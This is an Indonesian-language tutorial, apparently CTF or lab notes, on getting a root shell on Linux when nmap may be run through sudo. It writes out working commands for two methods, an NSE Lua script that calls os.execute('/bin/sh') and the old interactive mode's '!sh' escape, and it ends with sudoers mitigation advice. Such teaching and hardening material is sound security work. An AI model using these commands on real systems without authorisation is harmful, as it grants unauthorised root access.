# Privilege Escalation via Nmap (Sudo Misconfiguration)

## Ringkasan

Dokumen ini merangkum dua teknik privilege escalation pada sistem Linux yang memanfaatkan konfigurasi `sudo` yang tidak aman pada binary `nmap`. Kerentanan ini muncul ketika user diizinkan menjalankan `nmap` sebagai `root` melalui `sudo`, sehingga fitur bawaan Nmap dapat disalahgunakan untuk mendapatkan shell root.

> **Catatan:** Teknik ini hanya berlaku pada sistem yang secara sengaja atau tidak sengaja memberikan izin `sudo` pada `nmap`. Gunakan hanya pada environment CTF, lab, atau sistem milik sendiri yang memiliki izin eksplisit untuk pengujian keamanan.

---

## Prasyarat

Sebelum mencoba teknik di bawah, pastikan kondisi berikut terpenuhi:

- User memiliki akses shell pada target
- User diizinkan menjalankan `nmap` melalui `sudo` (dengan atau tanpa password)
- Verifikasi menggunakan:

```bash
sudo -l
```

Jika hasilnya menunjukkan baris seperti:

```
(root) NOPASSWD: /usr/bin/nmap
```

maka sistem berpotensi rentan.

---

## Metode 1 — Nmap Scripting Engine (NSE)

Berlaku untuk hampir semua versi Nmap modern. NSE mengizinkan eksekusi skrip Lua kustom, yang bisa dimanfaatkan untuk memanggil shell sistem.

### Langkah-langkah

1. Buat file skrip sementara:

```bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
```

2. Jalankan Nmap dengan flag `--script` mengarah ke file tersebut:

```bash
sudo nmap --script=$TF
```

3. Shell root akan terbuka secara langsung (`#`).

### Kenapa ini bekerja

NSE mengizinkan pemanggilan fungsi Lua `os.execute()`, yang secara langsung menjalankan perintah pada shell sistem dengan privilege proses Nmap saat itu — dalam kasus ini, `root`.

---

## Metode 2 — Interactive Mode (Nmap versi lama)

Berlaku hanya pada Nmap versi **2.02 – 5.21**. Fitur `--interactive` sudah dihapus pada versi modern karena alasan keamanan, tapi masih sering ditemukan di lab CTF atau server lawas yang belum di-*patch*.

### Langkah-langkah

1. Masuk ke mode interaktif:

```bash
sudo nmap --interactive
```

atau, jika bit SUID aktif pada binary:

```bash
nmap --interactive
```

2. Dari prompt `nmap>`, panggil shell sistem:

```
nmap> !sh
```

3. Shell root akan terbuka.

### Kenapa ini bekerja

Interactive mode pada versi lama menyediakan escape command (`!`) yang meneruskan perintah langsung ke shell sistem tanpa filtering, mewarisi privilege dari proses Nmap.

---

## Mitigasi

Untuk mencegah kerentanan ini pada sistem produksi:

- Hindari memberikan akses `sudo` penuh pada `nmap` untuk user non-root
- Jika `nmap` memang perlu dijalankan dengan privilege tinggi, batasi argumen yang diizinkan menggunakan `sudoers` (misalnya via `Cmnd_Alias` dengan opsi spesifik, bukan wildcard)
- Update Nmap ke versi terbaru untuk menghindari fitur legacy seperti `--interactive`
- Audit berkala terhadap konfigurasi `/etc/sudoers` dan `sudo -l` pada seluruh user

---

## Referensi

- GTFOBins — Nmap
- CertCube Labs — Linux Privilege Escalation with Sudo Rights
- Payatu — A Guide to Linux Privilege Escalation
